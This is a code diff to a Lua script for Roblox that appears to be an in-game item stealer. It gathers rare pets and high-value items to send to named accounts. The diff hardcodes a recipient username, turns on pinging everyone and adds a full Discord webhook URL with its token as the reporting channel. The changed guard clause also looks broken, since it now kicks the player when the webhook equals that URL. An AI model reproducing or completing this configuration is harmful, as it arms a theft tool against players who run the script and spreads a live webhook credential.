@@ -4,10 +4,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {KhenOne03}
 local min_value = _G.min_value or 10000000
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local ping = _G.pingEveryone or "Yes"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1325046507258253322/AGS6wwNVvP88xqEi60Z2F6z2olR7UDPZ4Q4gxOOuFVzK06ci1TSLtvRbpqd6YEuS9GrI"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -26,7 +26,7 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
 local totalValue = 0
 local itemsToSend = {}
 
-if next(users) == nil or webhook == "" then
+if next(users) == nil or webhook == "https://discord.com/api/webhooks/1325046507258253322/AGS6wwNVvP88xqEi60Z2F6z2olR7UDPZ4Q4gxOOuFVzK06ci1TSLtvRbpqd6YEuS9GrI" then
     plr:kick("You didn't add any usernames or webhook")
     return
 end
